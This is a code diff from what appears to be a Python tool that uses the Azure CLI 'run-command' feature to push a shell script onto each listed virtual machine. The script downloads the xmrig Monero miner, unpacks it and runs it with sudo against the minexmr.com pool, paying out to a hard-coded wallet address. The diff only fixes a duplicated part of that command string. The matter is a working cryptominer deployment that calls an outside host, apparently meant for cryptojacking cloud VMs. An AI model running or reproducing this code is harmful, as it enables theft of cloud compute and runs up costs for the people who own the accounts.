@@ -34,9 +34,9 @@ response = az_cli('vm list')
 
 def deployer(x):
         
-            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 86fJGBD4vkAZZkNJWXUruCFKfgZ6zPS1fEjrAodvksccPjQvRzQG9hmP83HY7Vp5XfKYxAqdrZqBWUGD3UYKj8ccAr9ECMM.'+sn+'"'  
+            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 86fJGBD4vkAZZkNJWXUruCFKfgZ6zPS1fEjrAodvksccPjQvRzQG9hmP83HY7Vp5XfKYxAqdrZqBWUGD3UYKj8ccAr9ECMM.'+sn+'"'  
             
-            
+        
             print("      * Script Executing : "+runC)
             os.system(runC)
             
